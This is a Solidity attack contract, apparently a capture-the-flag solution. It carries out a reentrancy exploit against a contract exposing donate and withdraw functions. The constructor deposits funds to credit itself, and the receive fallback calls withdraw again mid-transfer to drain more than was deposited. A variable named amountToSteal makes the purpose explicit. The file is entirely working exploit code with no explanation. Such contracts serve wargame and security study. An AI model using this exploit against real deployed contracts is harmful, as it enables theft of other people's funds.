// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Reentrancer {
    IReentrance target;
    uint amountToSteal;
    bool reentering;

    constructor(address _target) payable {
        target = IReentrance(_target);
        amountToSteal = msg.value;
        target.donate{value: msg.value}(address(this));
    }

    function withdraw() public {
        target.withdraw(amountToSteal);
    }

    receive() payable external {
        if (!reentering) {
            target.withdraw(amountToSteal);
            reentering = true;
        }
    }

}